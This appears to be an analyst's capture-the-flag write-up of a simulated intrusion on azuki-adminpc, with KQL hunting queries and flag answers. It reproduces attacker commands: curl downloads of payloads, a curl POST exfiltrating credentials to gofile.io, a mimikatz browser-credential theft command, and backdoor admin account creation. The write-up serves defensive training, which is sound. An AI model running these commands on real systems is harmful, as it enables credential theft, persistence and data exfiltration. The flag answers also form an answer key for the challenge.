# SOC Incident Investigation – Azuki Import/Export Compromise Part 3

<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/b5e3098f-2401-4d02-888c-e32bee920d4b" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** azuki-adminpc

---

## Overview
Five days after the file server breach, threat actors returned with sophisticated tools and techniques. The attacker pivoted from the compromised workstation to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data including financial records and password databases.

---

## Key Findings

### Lateral Movement
- Source IP: `10.1.0.204`
- Compromised User: `yuki.tanaka`
- Device: `azuki-adminpc`

### Execution
- Payload Hosting Service: `litter.catbox.moe`
- Malware Download Command: `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
- Archive Extraction Command: `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

### Discovery
- Session Enumeration: `qwinsta.exe`
- Domain Trust Enumeration: `"nltest.exe" /domain_trusts /all_trusts`
- Network Connection Enumeration: `"NETSTAT.EXE" -ano`
- Password Database Search: `where /r C:\Users *.kdbx`
- Credential File Discovered: `OLD-Passwords.txt`

### Persistence
- C2 Implant: `meterpreter.exe`
- Named Pipe: `\Device\NamedPipe\msf-pipe-5902`
- Backdoor Account: `yuki.tanaka2`
- Privilege Escalation Command: `net localgroup Administrators yuki.tanaka2 /add`

### Credential Access
- Account Creation Command: `net user yuki.tanaka2 B@ckd00r2024! /add`
- Credential Theft Tool Download: `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
- Browser Credential Theft Command: `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`
- Master Password Extraction file: `KeePass-Master-Password.txt`

### Collection
- Data Staging Directory: `C:\ProgramData\Microsoft\Crypto\staging`
- Automated Data Collection Command: `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`
- Exfiltration Volume - number of archives created: `8`

### Exfiltration
- Data Upload Command: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`
- Cloud Storage Service: `gofile.io`
- Destination Server IP: `45.112.123.227`

---

## Full Timeline

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 04:06:41 |	**Flag 1,2,3** |	Lateral Movement |	Source IP → 10.1.0.204; Target AccName/Device → yuki.tanaka, azuki-adminpc |
| 04:08:58 |	**Flag 12** |	Discovery |	Session Enumeration command → qwinsta.exe |
| 04:09:25 |	**Flag 13** |	Discovery |	Domain Trust Enumeration → "nltest.exe" /domain_trusts /all_trusts |
| 04:10:07 |	**Flag 14** |	Discovery |	Network Connection Enumeration → "NETSTAT.EXE" -ano |
| 04:13:45 |	**Flag 15** |	Discovery |	Password Database Search → where /r C:\Users *.kdbx |
| 04:15:52 |	**Flag 16** |	Discovery |	Credential File → OLD-Passwords.txt |
| 04:21:12 |	**Flag 4,5** |	Execution |	Malware Download Command & Hosting Service → "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z & litter.catbox.moe |
| 04:21:32 |	**Flag 6** |	Execution |	Archive Extraction Command → "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y |
| 04:21:33 |	**Flag 7** |	Persistence |	C2 Implant → meterpreter.exe |
| 04:24:35 |	**Flag 8** |	Persistence |	Named Pipe → \Device\NamedPipe\msf-pipe-5902 |
| 04:28:09 |	**Flag 17** |	Collection |	Data Staging Directory → C:\ProgramData\Microsoft\Crypto\staging |
| 04:37:03 |	**Flag 18** |	Collection |	Automated Data Collection Command → "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP |
| 04:37:33 → 04:40:30 |	**Flag 19** |	Collection |	Exfiltration Volume → 8 |
| 04:39:16 |	**Flag 25** |	Credential Access |	Master Password Extraction → KeePass-Master-Password.txt |
| 04:41:51 |	**Flag 22,23** |	Exfiltration |	Data Upload Command & Cloud Storage Service → "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile & gofile.io |
| 04:41:52 |	**Flag 24** |	Exfiltration |	Destination Server IP → 45.112.123.227 |
| 04:51:08 |	**Flag 9,10** |	Credential Access & Persistence |	Account Creation command & account created → net user yuki.tanaka2 B@ckd00r2024! /add& yuki.tanaka2 |
| 04:51:23 |	**Flag 11** |	Persistence |	Privilege Escalation Command → net localgroup Administrators yuki.tanaka2 /add |
| 05:55:34 |	**Flag 20** |	Credential Access |	Credential Theft Tool Download → "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z |
| 05:55:54 |	**Flag 21** |	Credential Access |	Browser Credential Theft  → "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit |

---

## 🚩 Flag 1, 2 & 3: LATERAL MOVEMENT - Source IP, Compromised Account, Target Device Name

- Answer flag 1: 10.1.0.204
- Answer flag 2: yuki.tanaka
- Answer flag 3: azuki-adminpc

Query used: (Timestamp filtered for 25nd of November)
```
DeviceLogonEvents
| where DeviceName contains "azuki-adminpc"
| where ActionType == "LogonSuccess"
| where RemoteIP != ""
| project Timestamp, DeviceName, ActionType, LogonType, AccountName, RemoteIP
| order by Timestamp asc
```
<img width="900" height="726" alt="image" src="https://github.com/user-attachments/assets/316c0e8c-ad2e-4b4c-97c3-41524da3f78a" />

As per the instructions, I checked for any LogonSuccess into azuki DeviceName 5 days after the initial access of the previous incident, and the azuki-adminpc came up, which was exactly the right Device I needed to look into further to find the Remote IP from which the threat actor accessed the Device.

---

## 🚩 Flag 4 & 5: EXECUTION - Payload Hosting Service & Malware Download Command

- Answer flag 4: litter.catbox.moe
- Answer flag 5: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z (the URL has been defanged)

Query used: 
```
DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| project Timestamp, RemoteIP, RemotePort, ActionType, RemoteUrl, LocalPort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName, InitiatingProcessAccountDomain
| order by Timestamp asc 
```

<img width="800" height="784" alt="image" src="https://github.com/user-attachments/assets/ea43d8e8-7d62-43b2-8ac7-87bf52de9399" />

The Answer to both flags can be seen in the Network Events, around the time of the malicious activities. The threat actor used the above mentioned command to access the litter.catbox.moe hosting service and download the malicious archive gfdb9v.7z and automatically renamed and saved it as KB5044273-x64.7z into C:\Windows\Temp\cache directory to masquerade it as a Windows security update.

---

## 🚩 Flag 6: EXECUTION - Archive Extraction Command

- Answer flag 6: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y

Query used: 
```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
```

<img width="900" height="462" alt="image" src="https://github.com/user-attachments/assets/88b229c6-2c68-4133-a9ce-79fbcb0d4c7d" />

The threat actor used the above mentioned command to extract the downloaded password-protected archive file into the C:\Windows\Temp\cache directory

---

## 🚩 Flag 7: PERSISTENCE - C2 Implant

- Answer flag 7: meterpreter.exe

Query used: 
```
DeviceFileEvents
| where FolderPath contains "C:\\Windows\\Temp\\cache"
| where DeviceName contains "azuki-adminpc"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc 
```

<img width="900" height="792" alt="image" src="https://github.com/user-attachments/assets/08309e1d-c728-4070-9448-89f50ea00eca" />

Upon investigation into what the threat actor extracted into the C:\Windows\Temp\cache directory, I could see several malicious files, among which was the meterpreter.exe, which was the C2 beacon filename.

---

## 🚩 Flag 8: PERSISTENCE - Named Pipe

- Answer flag 8: \Device\NamedPipe\msf-pipe-5902

Query used: 
```
DeviceEvents
| where DeviceName contains "azuki-adminpc"
| project Timestamp, FileName, FolderPath, AdditionalFields
```

<img width="900" height="940" alt="image" src="https://github.com/user-attachments/assets/b4cf4dbc-2144-44bc-b0ff-aaab69c71612" />

The meterpreter c2 beacon used named pipes as a c2 channel for communication. Named Pipe is a Windows inter-process communication (IPC) mechanism and it doesn't create any network traffic and blends in well with legitimate Windows IPC.

---

## 🚩 Flag 9 & 10: CREDENTIAL ACCESS - Decoded Account Creation & PERSISTENCE - Backdoor Account

- Answer flag 9: net user yuki.tanaka2 B@ckd00r2024! /add
- Answer flag 10: yuki.tanaka2

Query used: 
```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "powershell"
| where AccountName == "yuki.tanaka"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
```

<img width="1000" height="462" alt="image" src="https://github.com/user-attachments/assets/0a853669-ebb2-443d-9e24-8f6598d16bfd" />

In the process events it was evident that the threat actor encoded a command and upon decoding it I could see that he created a backdoor account called yuki.tanaka2 with the password B@ckd00r2024!. 

---

## 🚩 Flag 11: PERSISTENCE - Decoded Privilege Escalation Command

- Answer flag 10: net localgroup Administrators yuki.tanaka2 /add

<img width="1000" height="468" alt="image" src="https://github.com/user-attachments/assets/8c43aca6-d327-46d3-bcbc-4539820b39f5" />

The threat actor encoded another command that was used to elevate privileges to the added backdoor account. He added it into the Administrators group.

---

## 🚩 Flag 12, 13, 14, 15, 16: DISCOVERY - Session Enumeration, Domain Trust Enumeration, Network Connection Enumeration, Password Database Search, Credential File

- Answer flag 12: qwinsta.exe
- Answer flag 13: "nltest.exe" /domain_trusts /all_trusts
- Answer flag 14: "NETSTAT.EXE" -ano
- Answer flag 15: where /r C:\Users *.kdbx
- Answer flag 16: OLD-Passwords.txt

Query used: 
```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
```

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/be9b311a-cc90-42a6-ab01-ec6d8723dde7" />

I inspected the Process events and filtered for the compromised user, to see the commands made by that profile to find overwhelming evidence of the commands used by the threat actor for session, Domain trust and network connection enumeration. The threat actor then looked for password databases and found what he was looking for, which was the OLD-Passwords.txt document.

---

## 🚩 Flag 17, 18: COLLECTION - Data Staging Directory & Automated Data Collection Command

- Answer flag 17: C:\ProgramData\Microsoft\Crypto\staging
- Answer flag 18: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP

<img width="900" height="458" alt="image" src="https://github.com/user-attachments/assets/4e3790d1-9338-4580-820e-8f7f56b43105" />

Furthermore, following the previous flags, I found the command where the threat actor copied the whole banking directory into his own staging directory, which answers both flags 17 and 18.

---

## 🚩 Flag 19: COLLECTION - Exfiltration Volume

- Answer flag 19: 8

Query used: 
```
DeviceFileEvents
| where FolderPath contains "C:\\ProgramData\\Microsoft\\Crypto\\staging"
| where FileName !contains ".pdf"
| where DeviceName contains "azuki-adminpc"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="900" height="608" alt="image" src="https://github.com/user-attachments/assets/8891f50e-0f17-4680-a8dd-6dcf7c07cdca" />

Within the threat actor's staging directory, I found 8 different archive files, filled with sensitive data, all ready to be exfiltrated.

---

## 🚩 Flag 20, 21: CREDENTIAL ACCESS - Credential Theft Tool Download & Browser Credential Theft

- Answer flag 20: "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z
- Answer flag 21: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit

Query used: 
```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
```

<img width="1000" height="200" alt="image" src="https://github.com/user-attachments/assets/506058a6-cc14-4729-a8fd-c5698c8d311d" />

Two more commands that I noticed in the process events were the download command for the credential theft tool and a command used for browser credential theft.

---

## 🚩 Flag 22, 23: EXFILTRATION - Data Upload Command & Cloud Storage Service

- Answer flag 22: "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile
- Answer flag 23: gofile[.]io

<img width="900" height="542" alt="image" src="https://github.com/user-attachments/assets/00a21406-f6de-4ae9-a6b9-c9fb4f92b3d6" />

With the same query used as in flag 21, within the process events, I filtered for the POST requests made by the threat actor so I could see what the threat actor exfiltrated and where he exfiltrated to.

---

## 🚩 Flag 24: EXFILTRATION - Destination Server

- Answer flag 24: 45.112.123.227

Query used: 
```
DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| project Timestamp, RemoteIP, RemotePort, ActionType, RemoteUrl, LocalPort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName, InitiatingProcessAccountDomain
| order by Timestamp asc
```
<img width="900" height="794" alt="image" src="https://github.com/user-attachments/assets/30b13253-c751-4db7-9d59-2f06a9a12dff" />

Following the previous results, I checked the network events to find the Remote IP of the exfiltration server / cloud storage service.

---

## 🚩 Flag 25: CREDENTIAL ACCESS - Master Password Extraction

- Answer flag 25: KeePass-Master-Password.txt

<img width="900" height="470" alt="image" src="https://github.com/user-attachments/assets/acb7e136-6b46-4eea-a878-3e7e590734d5" />

Another command I previously found in the process events was the command that creates a compressed archive named credentials.tar.gz containing a KeePass database and a text file with its master password.


